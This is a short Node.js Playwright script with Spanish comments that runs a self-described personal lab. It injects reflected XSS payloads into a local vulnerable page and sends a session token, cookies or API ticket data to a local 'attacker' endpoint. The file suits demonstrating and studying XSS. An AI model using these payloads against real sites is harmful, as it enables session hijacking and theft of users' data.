// Laboratorio propio: siembra un XSS en lab/vulnerable.html y mira qué se lleva el "atacante" de lab/atacante.mjs.
//   node lab/probar-xss.mjs token | cookie | datos
import { chromium } from '@playwright/test';
const modo = process.argv[2]; // token | cookie
const BASE = 'http://127.0.0.1:3110';
const payload = modo === 'token'
  ? `<img src=x onerror="fetch('http://127.0.0.1:3119/robo?token='+encodeURIComponent(localStorage.getItem('token')))">`
  : modo === 'cookie'
  ? `<img src=x onerror="fetch('http://127.0.0.1:3119/robo?cookie='+encodeURIComponent(document.cookie))">`
  : `<img src=x onerror="fetch('/api/tickets').then(r=>r.text()).then(t=>fetch('http://127.0.0.1:3119/robo?datos='+encodeURIComponent(t.slice(0,70))))">`;
const b = await chromium.launch();
const p = await b.newPage();
p.on('console', (m) => console.log('[consola]', m.text()));
await p.goto(`${BASE}/lab/vulnerable.html`);
await p.click(modo === 'token' ? '#entrar-token' : '#entrar-cookie');
await p.waitForFunction(() => document.getElementById('estado').textContent !== 'Sin sesión');
console.log('estado:', await p.textContent('#estado'));
await p.goto(`${BASE}/lab/vulnerable.html?q=${encodeURIComponent(payload)}`);
await p.waitForTimeout(800);
await b.close();
